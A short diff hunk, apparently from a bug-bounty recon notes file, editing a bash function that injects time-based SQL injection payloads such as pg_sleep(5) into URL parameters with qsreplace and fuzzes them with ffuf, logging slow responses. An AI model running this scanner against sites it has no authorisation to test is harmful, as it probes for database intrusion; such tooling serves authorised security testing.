@@ -23,7 +23,7 @@ pg_sleep(5)
 ```
 # Time Based Sql Injection
 sqliTime(){
-for i in $(cat ~/.jaeles/resources/payloads) ; do
+for i in $(cat ~/.pathToPayloadsList/payloads) ; do
   cat $1 | qsreplace "$i" > sqli
   ffuf -u FUZZ -w sqli -s -ft "<5000" | tee -a vulnSqli.txt
   rm sqli
